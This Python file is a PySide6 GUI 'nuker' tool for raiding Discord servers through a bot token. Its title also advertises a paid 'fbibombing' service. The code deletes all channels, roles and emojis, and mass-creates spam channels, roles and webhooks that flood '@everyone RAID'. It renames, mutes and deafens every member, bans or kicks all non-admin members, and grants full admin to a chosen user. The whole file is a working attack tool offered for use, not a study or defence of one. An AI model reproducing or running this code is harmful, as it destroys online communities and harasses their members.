import sys
import asyncio
import random
import discord
import requests
from PySide6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
                               QLabel, QLineEdit, QPushButton, QGroupBox, QGridLayout, QTextEdit, QTabWidget, QSpinBox, QCheckBox)
from PySide6.QtCore import Qt, QThread, Signal
from PySide6.QtGui import QFont

BG_COLOR = "#050505"
PANEL_BG = "#0a0a0a"
TEXT_COLOR = "#00ff00"
BORDER_COLOR = "#003300"
ACCENT_COLOR = "#00ff00"
ACCENT_DARK = "#004d00"
RED_COLOR = "#8b0000"
ORANGE_COLOR = "#8b4500"

def GetGroupStyle():
    return f"""
        QGroupBox {{
            font-weight: bold;
            border: 1px solid {BORDER_COLOR};
            border-radius: 2px;
            margin-top: 12px;
            padding-top: 10px;
            color: {ACCENT_COLOR};
            background-color: transparent;
        }}
        QGroupBox::title {{ subcontrol-origin: margin; left: 10px; padding: 0 3px; }}
    """

class HackCheckBox(QCheckBox):
    def __init__(self, text):
        super().__init__(text)
        self.setStyleSheet(f"""
            QCheckBox {{ color: {TEXT_COLOR}; spacing: 5px; font-size: 12px; }}
            QCheckBox::indicator {{ width: 16px; height: 16px; border: 1px solid #004400; background: #000; }}
            QCheckBox::indicator:checked {{ background: {ACCENT_COLOR}; border: 1px solid {ACCENT_COLOR}; color: black; }}
        """)

class WorkerThread(QThread):
    log_signal = Signal(str)

    def __init__(self, token, target_id, config):
        super().__init__()
        self.token = token
        self.target_id = int(target_id)
        self.config = config
        self.client = discord.Client(intents=discord.Intents.all())

    def run(self):
        asyncio.run(self.main())

    async def main(self):
        self.log_signal.emit("[SYS] Initializing connection...")
        try:
            await self.client.start(self.token)
        except Exception as e:
            self.log_signal.emit(f"[ERR] Login Failed: {e}")

    async def on_ready(self):
        self.log_signal.emit(f"[OK] Connected: {self.client.user.name}")

    async def execute_nuke(self):
        guild = self.client.get_guild(self.target_id)
        if not guild:
            self.log_signal.emit("[ERR] Server not found.")
            return

        self.log_signal.emit("[START] Executing Payload...")
        sem = asyncio.Semaphore(15)
        
        # --- TAB 1: WIPE ---
        if self.config.get('wipe_channels', False):
            self.log_signal.emit("[TASK] Deleting Channels...")
            async def d(c): 
                async with sem:
                    try: await c.delete()
                    except: pass
            await asyncio.gather(*[d(c) for c in guild.channels], return_exceptions=True)

        if self.config.get('wipe_roles', False):
            self.log_signal.emit("[TASK] Deleting Roles...")
            async def r(r): 
                async with sem:
                    if not r.managed and r.name != "@everyone":
                        try: await r.delete()
                        except: pass
            await asyncio.gather(*[r(r) for r in guild.roles], return_exceptions=True)

        if self.config.get('wipe_emojis', False):
            self.log_signal.emit("[TASK] Deleting Emojis...")
            for e in guild.emojis:
                try: await e.delete()
                except: pass

        # --- TAB 2: BUILD ---
        if self.config.get('create_channels', False):
            count = self.config.get('channel_count', 10)
            cname = self.config.get('channel_name', 'nuked')
            self.log_signal.emit(f"[TASK] Creating {count} Channels ({cname})...")
            async def make_ch():
                try:
                    ch = await guild.create_text_channel(cname)
                    if self.config.get('create_webhooks', False):
                        try:
                            wh = await ch.create_webhook(name="RAID")
                            asyncio.create_task(self.spam_webhook(wh))
                        except: pass
                    asyncio.create_task(self.spam_channel(ch))
                except: pass
            await asyncio.gather(*[make_ch() for _ in range(count)], return_exceptions=True)

        if self.config.get('create_roles', False):
            count = self.config.get('role_count', 10)
            rname = self.config.get('role_name', 'RAID')
            self.log_signal.emit(f"[TASK] Creating {count} Roles ({rname})...")
            for _ in range(count):
                try: await guild.create_role(name=rname, color=random.randint(0, 0xFFFFFF))
                except: pass

        # --- TAB 3: SPAM ---
        if self.config.get('spam_channels', False):
            # Grab the message from the spam tab input box
            msg = self.config['spam_msg']
            self.log_signal.emit("[TASK] Spamming...")
            for ch in guild.text_channels:
                for _ in range(20):
                    try: await ch.send(msg)
                    except: await asyncio.sleep(1)

        # --- TAB 4: ABUSE ---
        if self.config.get('nick_all', False):
            self.log_signal.emit("[TASK] Nicknaming Members...")
            nick = self.config['nick_name']
            for m in guild.members:
                if not m.bot:
                    try: await m.edit(nick=nick)
                    except: pass

        if self.config.get('mute_all', False):
            self.log_signal.emit("[TASK] Muting Members...")
            for m in guild.members:
                if not m.bot:
                    try: await m.edit(mute=True)
                    except: pass

        if self.config.get('deafen_all', False):
            self.log_signal.emit("[TASK] Deafening Members...")
            for m in guild.members:
                if not m.bot:
                    try: await m.edit(deafen=True)
                    except: pass

        self.log_signal.emit("[COMPLETE] Payload Finished.")

    async def ban_members(self):
        guild = self.client.get_guild(self.target_id)
        if not guild: return
        self.log_signal.emit("[LIVE] Banning Members...")
        sem = asyncio.Semaphore(5)
        async def b(m):
            async with sem:
                if m.bot: return
                if m.guild_permissions.administrator: return
                try: await m.ban(reason="Nuked")
                except: pass
        await asyncio.gather(*[b(m) for m in guild.members], return_exceptions=True)
        self.log_signal.emit("[LIVE] Ban Wave Complete.")

    async def kick_members(self):
        guild = self.client.get_guild(self.target_id)
        if not guild: return
        self.log_signal.emit("[LIVE] Kicking Members...")
        sem = asyncio.Semaphore(5)
        async def k(m):
            async with sem:
                if m.bot: return
                if m.guild_permissions.administrator: return
                try: await m.kick(reason="Nuked")
                except: pass
        await asyncio.gather(*[k(m) for m in guild.members], return_exceptions=True)
        self.log_signal.emit("[LIVE] Kick Wave Complete.")

    async def spam_webhook(self, wh):
        msg = self.config['spam_msg']
        for _ in range(20):
            try: await wh.send(msg)
            except: return

    async def spam_channel(self, ch):
        msg = self.config['spam_msg']
        for _ in range(20):
            try: await ch.send(msg)
            except: await asyncio.sleep(1)

    async def live_admin(self, uid):
        guild = self.client.get_guild(self.target_id)
        if not guild: return
        try:
            role = await guild.create_role(name="Admin", permissions=discord.Permissions.all())
            user = guild.get_member(int(uid))
            if user:
                await user.add_roles(role)
                self.log_signal.emit(f"[LIVE] Admin given to {user.name}")
        except Exception as e:
            self.log_signal.emit(f"[ERR] {e}")

    async def live_nick(self, nick):
        guild = self.client.get_guild(self.target_id)
        if not guild: return
        for m in guild.members:
            if not m.bot:
                try: await m.edit(nick=nick)
                except: pass
        self.log_signal.emit("[LIVE] Nicknames changed.")

class App(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("free edition : fbibombing on discord and telegram for paid")
        self.resize(1200, 800)
        self.setStyleSheet(f"background-color: {BG_COLOR}; color: {TEXT_COLOR}; font-family: 'Consolas';")
        
        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        main_layout = QHBoxLayout(main_widget)
        main_layout.setSpacing(0)
        main_layout.setContentsMargins(0, 0, 0, 0)

        left_panel = QWidget()
        left_panel.setMaximumWidth(400)
        left_panel.setStyleSheet(f"background-color: {PANEL_BG}; border-right: 1px solid {BORDER_COLOR};")
        left_layout = QVBoxLayout(left_panel)
        left_layout.setContentsMargins(10, 10, 10, 10)
        left_layout.setSpacing(5)

        lbl_header = QLabel("NUKE SETTINGS")
        lbl_header.setFont(QFont("Consolas", 16, QFont.Bold))
        lbl_header.setStyleSheet("color: white; padding: 5px;")
        left_layout.addWidget(lbl_header)

        tabs = QTabWidget()
        tabs.setStyleSheet(f"QTabWidget::pane {{ border: none; background: transparent; }} QTabBar::tab {{ background: #0a0a0a; color: #004400; padding: 8px 15px; border-bottom: 2px solid transparent; }} QTabBar::tab:selected {{ color: {ACCENT_COLOR}; border-bottom: 2px solid {ACCENT_COLOR}; }}")
        
        tab1 = QWidget()
        t1_layout = QVBoxLayout(tab1)
        self.c_wipe_ch = HackCheckBox("Remove Channels")
        self.c_wipe_roles = HackCheckBox("Remove Roles")
        self.c_wipe_emojis = HackCheckBox("Remove Emojis")
        g_wipe = QGroupBox("Destruction")
        g_wipe.setStyleSheet(GetGroupStyle())
        gl_wipe = QVBoxLayout(g_wipe)
        gl_wipe.addWidget(self.c_wipe_ch)
        gl_wipe.addWidget(self.c_wipe_roles)
        gl_wipe.addWidget(self.c_wipe_emojis)
        t1_layout.addWidget(g_wipe)
        
        tab2 = QWidget()
        t2_layout = QVBoxLayout(tab2)
        self.c_make_ch = HackCheckBox("Create Channels")
        self.spin_ch = QSpinBox(); self.spin_ch.setRange(1, 200); self.spin_ch.setValue(20)
        self.spin_ch.setStyleSheet("background:#000;border:1px solid #003300;color:#0f0;padding:2px;")
        self.edit_ch_name = QLineEdit(placeholderText="Channel Name"); self.edit_ch_name.setText("nuked")
        self.edit_ch_name.setStyleSheet("background:#000;border:1px solid #333;color:#fff;padding:5px;")
        self.c_make_roles = HackCheckBox("Create Roles")
        self.spin_roles = QSpinBox(); self.spin_roles.setRange(1, 200); self.spin_roles.setValue(20)
        self.spin_roles.setStyleSheet("background:#000;border:1px solid #003300;color:#0f0;padding:2px;")
        self.edit_role_name = QLineEdit(placeholderText="Role Name"); self.edit_role_name.setText("RAID")
        self.edit_role_name.setStyleSheet("background:#000;border:1px solid #333;color:#fff;padding:5px;")
        g_build = QGroupBox("Construction")
        g_build.setStyleSheet(GetGroupStyle())
        gl_build = QGridLayout(g_build)
        gl_build.addWidget(self.c_make_ch, 0, 0); gl_build.addWidget(self.spin_ch, 0, 1)
        gl_build.addWidget(self.edit_ch_name, 1, 0, 1, 2)
        gl_build.addWidget(self.c_make_roles, 2, 0); gl_build.addWidget(self.spin_roles, 2, 1)
        gl_build.addWidget(self.edit_role_name, 3, 0, 1, 2)
        t2_layout.addWidget(g_build)
        
        tab3 = QWidget()
        t3_layout = QVBoxLayout(tab3)
        g_spam = QGroupBox("SPAM CONTENT")
        g_spam.setStyleSheet(GetGroupStyle())
        gs_layout = QVBoxLayout(g_spam)
        gs_layout.addWidget(QLabel("Channel/Webhook Message:"))
        self.edit_spam = QLineEdit(placeholderText="Message to spam...")
        self.edit_spam.setText("@everyone RAID")
        self.edit_spam.setStyleSheet("background:#000;border:1px solid #333;color:#fff;padding:5px;")
        gs_layout.addWidget(self.edit_spam)
        t3_layout.addWidget(g_spam)
        t3_layout.addStretch()
        tabs.addTab(tab3, "Spam")

        tab4 = QWidget()
        t4_layout = QVBoxLayout(tab4)
        self.c_nick = HackCheckBox("Nickname All")
        self.edit_nick = QLineEdit(placeholderText="Nickname"); self.edit_nick.setText("HACKED")
        self.edit_nick.setStyleSheet("background:#000;border:1px solid #333;color:#fff;padding:5px;")
        self.c_mute = HackCheckBox("Server Mute All (Voice)")
        self.c_deafen = HackCheckBox("Server Deafen All (Voice)")
        g_abuse = QGroupBox("Member Abuse")
        g_abuse.setStyleSheet(GetGroupStyle())
        gl_abuse = QVBoxLayout(g_abuse)
        gl_abuse.addWidget(self.c_nick)
        gl_abuse.addWidget(self.edit_nick)
        gl_abuse.addWidget(self.c_mute)
        gl_abuse.addWidget(self.c_deafen)
        t4_layout.addWidget(g_abuse)

        tabs.addTab(tab1, "Wipe")
        tabs.addTab(tab2, "Build")
        tabs.addTab(tab3, "Spam")
        tabs.addTab(tab4, "Abuse")
        
        left_layout.addWidget(tabs)
        
        g_conn = QGroupBox("Connection")
        g_conn.setStyleSheet(GetGroupStyle())
        conn_l = QVBoxLayout(g_conn)
        self.token = QLineEdit(placeholderText="Bot Token")
        self.token.setEchoMode(QLineEdit.Password)
        self.token.setStyleSheet("background: #000; border: 1px solid #003300; padding: 8px; color: white;")
        self.gid = QLineEdit(placeholderText="Server ID")
        self.gid.setStyleSheet("background: #000; border: 1px solid #003300; padding: 8px; color: white;")
        conn_l.addWidget(self.token); conn_l.addWidget(self.gid)
        self.btn_exec = QPushButton("EXECUTE PAYLOAD")
        self.btn_exec.setStyleSheet(f"QPushButton {{ background-color: {ACCENT_DARK}; color: white; padding: 15px; font-weight: bold; border: 1px solid {ACCENT_COLOR}; }} QPushButton:hover {{ background-color: {ACCENT_COLOR}; color: black; }}")
        self.btn_exec.clicked.connect(self.start_operation)
        conn_l.addWidget(self.btn_exec)
        left_layout.addWidget(g_conn)
        
        main_layout.addWidget(left_panel)

        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        right_layout.setContentsMargins(10, 10, 10, 10)
        
        right_tabs = QTabWidget()
        right_tabs.setStyleSheet(f"QTabWidget::pane {{ border: none; background: transparent; }} QTabBar::tab {{ background: #0a0a0a; color: #004400; padding: 8px 15px; border-bottom: 2px solid transparent; }} QTabBar::tab:selected {{ color: {ACCENT_COLOR}; border-bottom: 2px solid {ACCENT_COLOR}; }}")
        
        console_w = QWidget()
        c_l = QVBoxLayout(console_w)
        self.log = QTextEdit()
        self.log.setReadOnly(True)
        self.log.setStyleSheet("background-color: #000; border: 1px solid #003300; color: #00ff00; font-family: 'Consolas'; font-size: 12px;")
        c_l.addWidget(self.log)
        right_tabs.addTab(console_w, "TERMINAL")

        live_w = QWidget()
        l_l = QVBoxLayout(live_w)
        l_l.setSpacing(10)
        
        g_remove = QGroupBox("MEMBER REMOVAL")
        g_remove.setStyleSheet(GetGroupStyle())
        gl_rem = QVBoxLayout(g_remove)
        btn_ban = QPushButton("BAN ALL MEMBERS")
        btn_ban.setStyleSheet(f"QPushButton {{ background-color: {RED_COLOR}; color: white; padding: 20px; font-weight: bold; font-size: 14px; border: 1px solid #ff0000; }} QPushButton:hover {{ background-color: #ff0000; }}")
        btn_ban.clicked.connect(self.live_ban)
        btn_kick = QPushButton("KICK ALL MEMBERS")
        btn_kick.setStyleSheet(f"QPushButton {{ background-color: {ORANGE_COLOR}; color: white; padding: 20px; font-weight: bold; font-size: 14px; border: 1px solid #ff8c00; }} QPushButton:hover {{ background-color: #ff8c00; }}")
        btn_kick.clicked.connect(self.live_kick)
        gl_rem.addWidget(btn_ban); gl_rem.addWidget(btn_kick)
        l_l.addWidget(g_remove)
        
        g_ladmin = QGroupBox("GIVE ADMIN")
        gl = QHBoxLayout(g_ladmin)
        self.live_uid = QLineEdit(placeholderText="User ID")
        self.live_uid.setStyleSheet("background:#000;border:1px solid #333;color:#fff;padding:5px;")
        btn_ad = QPushButton("EXECUTE")
        btn_ad.setStyleSheet("background:#004d00;color:white;padding:10px;")
        btn_ad.clicked.connect(self.live_admin)
        gl.addWidget(self.live_uid); gl.addWidget(btn_ad)
        l_l.addWidget(g_ladmin)
        
        g_lnick = QGroupBox("NICKNAME ALL")
        gln = QHBoxLayout(g_lnick)
        self.live_nick_edit = QLineEdit(placeholderText="Nickname")
        self.live_nick_edit.setStyleSheet("background:#000;border:1px solid #333;color:#fff;padding:5px;")
        btn_n = QPushButton("CHANGE")
        btn_n.setStyleSheet("background:#004d00;color:white;padding:10px;")
        btn_n.clicked.connect(self.live_nick)
        gln.addWidget(self.live_nick_edit); gln.addWidget(btn_n)
        l_l.addWidget(g_lnick)
        
        l_l.addStretch()
        right_tabs.addTab(live_w, "LIVE CONTROL")
        
        right_layout.addWidget(right_tabs)
        main_layout.addWidget(right_panel, stretch=1)

        self.thread = None

    def get_config(self):
        return {
            'wipe_channels': self.c_wipe_ch.isChecked(), 'wipe_roles': self.c_wipe_roles.isChecked(),
            'wipe_emojis': self.c_wipe_emojis.isChecked(), 
            'create_channels': self.c_make_ch.isChecked(), 'create_roles': self.c_make_roles.isChecked(), 
            'nick_all': self.c_nick.isChecked(), 'mute_all': self.c_mute.isChecked(), 'deafen_all': self.c_deafen.isChecked(), 
            'channel_count': self.spin_ch.value(), 'channel_name': self.edit_ch_name.text(), 
            'role_count': self.spin_roles.value(), 'role_name': self.edit_role_name.text(), 'spam_msg': self.edit_spam.text(), 
            'nick_name': self.edit_nick.text()
        }

    def start_operation(self):
        t = self.token.text()
        g = self.gid.text()
        if not t or not g: return
        self.thread = WorkerThread(t, g, self.get_config())
        self.thread.log_signal.connect(self.log.append)
        self.thread.start()
        self.btn_exec.setEnabled(False)
        self.btn_exec.setText("PAYLOAD ACTIVE")
        asyncio.create_task(self.wait_and_exec())

    async def wait_and_exec(self):
        await asyncio.sleep(3) 
        if self.thread and self.thread.client.is_ready():
            asyncio.run_coroutine_threadsafe(self.thread.execute_nuke(), self.thread.client.loop)

    def live_ban(self):
        if self.thread: asyncio.run_coroutine_threadsafe(self.thread.ban_members(), self.thread.client.loop)

    def live_kick(self):
        if self.thread: asyncio.run_coroutine_threadsafe(self.thread.kick_members(), self.thread.client.loop)

    def live_admin(self):
        if self.thread:
            uid = self.live_uid.text()
            if uid: asyncio.run_coroutine_threadsafe(self.thread.live_admin(uid), self.thread.client.loop)

    def live_nick(self):
        if self.thread:
            nick = self.live_nick_edit.text()
            if nick: asyncio.run_coroutine_threadsafe(self.thread.live_nick(nick), self.thread.client.loop)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    win = App()
    win.show()
    sys.exit(app.exec())
